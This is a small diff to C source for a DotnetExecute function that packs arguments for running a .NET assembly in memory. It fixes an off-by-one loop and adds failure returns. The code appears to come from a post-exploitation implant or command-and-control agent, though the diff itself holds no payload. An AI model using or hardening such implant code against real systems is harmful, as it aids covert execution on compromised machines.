@@ -208,14 +208,16 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     Instance.Dotnet->vtPsa.vt     = ( VT_ARRAY | VT_BSTR );
     Instance.Dotnet->vtPsa.parray = Instance.Win32.SafeArrayCreateVector( VT_BSTR, 0, ArgumentsCount );
 
-    for ( LONG i = 0; i <= ArgumentsCount; i++ ) {
+    for ( LONG i = 0; i < ArgumentsCount; i++ ) {
         if ( ( Result = Instance.Win32.SafeArrayPutElement( Instance.Dotnet->vtPsa.parray, &i, Instance.Win32.SysAllocString( ArgumentsArray[ i ] ) ) ) ) {
             PRINTF( "Args SafeArrayPutElement Failed: %x\n", Result )
+            return FALSE;
         }
     }
 
     if ( ( Result = Instance.Win32.SafeArrayPutElement( Instance.Dotnet->MethodArgs, idx, &Instance.Dotnet->vtPsa ) ) ) {
         PRINTF( "SafeArrayPutElement Failed: %x\n", Result )
+            return FALSE;
     }
 
     Instance.Dotnet->StdOut = Instance.Win32.GetStdHandle( STD_OUTPUT_HANDLE );
